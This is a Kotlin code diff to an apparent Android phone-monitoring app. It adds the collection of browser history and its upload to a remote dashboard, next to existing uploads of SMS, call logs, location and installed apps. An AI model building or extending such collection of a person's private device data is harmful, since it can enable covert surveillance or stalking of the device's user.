@@ -10,6 +10,7 @@ import com.spapp.monitoring.collectors.FileManagerCollector
 import com.spapp.monitoring.collectors.InstalledAppsCollector
 import com.spapp.monitoring.collectors.LocationFetcher
 import com.spapp.monitoring.collectors.SmsLogCollector
+import com.spapp.monitoring.collectors.WebHistoryCollector
 import com.spapp.monitoring.data.DeviceState
 import com.spapp.monitoring.data.local.AppDatabase
 import com.spapp.monitoring.filetransfer.FileTransferClient
@@ -26,6 +27,8 @@ import com.spapp.monitoring.network.LocationReportRequest
 import com.spapp.monitoring.network.RemoteCommand
 import com.spapp.monitoring.network.SmsLogEntryDto
 import com.spapp.monitoring.network.SmsLogSyncRequest
+import com.spapp.monitoring.network.WebHistoryEntryDto
+import com.spapp.monitoring.network.WebHistorySyncRequest
 import java.time.Instant
 
 /**
@@ -56,6 +59,9 @@ class SyncRunner(private val context: Context) {
 
         if (flags.app_usage_tracking) {
             syncAppUsage(bearer, db)
+        }
+        if (flags.web_history_tracking) {
+            syncWebHistory(bearer)
         }
         if (flags.sms_log) {
             syncSmsLog(bearer, db)
@@ -270,6 +276,29 @@ class SyncRunner(private val context: Context) {
             if (response.isSuccessful) {
                 db.callLogDao().deleteByIds(unsynced.map { it.id })
             }
+        } catch (e: Exception) {
+            // Retried on next scheduled run.
+        }
+    }
+
+    /**
+     * Best-effort only — see WebHistoryCollector's doc comment. On a modern
+     * Chrome-only device this reliably collects nothing (no third-party
+     * history API exists), so unlike SMS/call logs there's no local buffer
+     * or high-water mark: each run just collects whatever's available right
+     * now and sends it. Re-sending overlapping entries on the rare
+     * legacy-browser device is harmless — there's no uniqueness constraint
+     * to violate, and the dashboard just shows a few duplicate rows.
+     */
+    private suspend fun syncWebHistory(bearer: String) {
+        val entries = WebHistoryCollector(context).collectRecent()
+        if (entries.isEmpty()) return
+
+        val dtos = entries.map {
+            WebHistoryEntryDto(it.url, it.title, Instant.ofEpochMilli(it.visitedAtEpochMs).toString())
+        }
+        try {
+            ApiClient.service.syncWebHistory(bearer, WebHistorySyncRequest(dtos))
         } catch (e: Exception) {
             // Retried on next scheduled run.
         }
